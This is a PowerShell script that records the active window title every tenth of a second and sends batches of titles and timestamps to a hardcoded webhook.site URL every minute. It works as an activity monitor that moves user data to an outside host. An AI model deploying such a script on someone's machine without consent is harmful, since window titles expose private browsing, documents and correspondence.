# Configuration
$WebhookUrl = "https://webhook.site/2c7348c4-f3c8-4021-bd78-95b6c172ad05"
$LogFile = "$PSScriptRoot\activity_log.txt"
$CheckInterval = 100 # Check every 0.1s
$BatchInterval = 60 # Send batch every 60 seconds

# Force TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Write-Host "Starting Smart Batch Logger..." -ForegroundColor Green
Add-Content -Path $LogFile -Value "[+] Smart Logger Started at $(Get-Date)"

$LastTitle = ""
$BatchData = @()
$LastBatchTime = Get-Date
$RetryWait = 10 # Start with 10s retry if failed

while ($true) {
    try {
        $CurrentTitle = "Desktop/Background"
        
        # Get Active Window Title
        $sig = '[DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); [DllImport("user32.dll")] public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);'
        $type = Add-Type -MemberDefinition $sig -Name Win32Utils -Namespace Win32Functions -PassThru -ErrorAction SilentlyContinue
        
        if ($type) {
            $handle = $type::GetForegroundWindow()
            $sb = New-Object System.Text.StringBuilder(256)
            $type::GetWindowText($handle, $sb, 256) | Out-Null
            $rawTitle = $sb.ToString()
            if (-not [string]::IsNullOrWhiteSpace($rawTitle)) { $CurrentTitle = $rawTitle }
        }

        # Filter system noise and rapid switching artifacts
        $ignoreList = @("Windows Input Experience", "Program Manager", "Microsoft Text Input Application", "Task Switching")
        $shouldIgnore = $false
        foreach ($item in $ignoreList) { if ($CurrentTitle -like "*$item*") { $shouldIgnore = $true } }

        # Queue data if window changed and isn't noise
        if ($CurrentTitle -ne $LastTitle -and -not $shouldIgnore) {
            $LastTitle = $CurrentTitle
            $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
            
            Add-Content -Path $LogFile -Value "[$Timestamp] QUEUED: $CurrentTitle"
            
            $BatchData += @{
                title = $CurrentTitle
                timestamp = $Timestamp
            }
        }

        # Check if it's time to send
        $TimeSinceBatch = (Get-Date) - $LastBatchTime
        if ($TimeSinceBatch.TotalSeconds -ge $BatchInterval -and $BatchData.Count -gt 0) {
            
            Write-Host "Attempting to send batch of $($BatchData.Count) items..." -ForegroundColor Yellow
            
            $JsonBody = $BatchData | ConvertTo-Json -Depth 3
            
            try {
                Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body $JsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing | Out-Null
                
                # Success! Reset everything
                Add-Content -Path $LogFile -Value "[SUCCESS] Batch sent: $($BatchData.Count) items."
                $BatchData = @() 
                $LastBatchTime = Get-Date
                $RetryWait = 10 # Reset retry timer on success
                
            } catch {
                # Failed! Increase wait time and keep data in queue
                Add-Content -Path $LogFile -Value "[ERROR] Send failed. Waiting ${RetryWait}s before retry."
                Start-Sleep -Seconds $RetryWait
                $RetryWait = $RetryWait * 2 # Double the wait time for next fail (Exponential Backoff)
                if ($RetryWait -gt 300) { $RetryWait = 300 } # Max wait 5 mins
            }
        }

    } catch {
        Add-Content -Path $LogFile -Value "[SYSTEM ERROR] $_"
    }

    Start-Sleep -Milliseconds $CheckInterval
}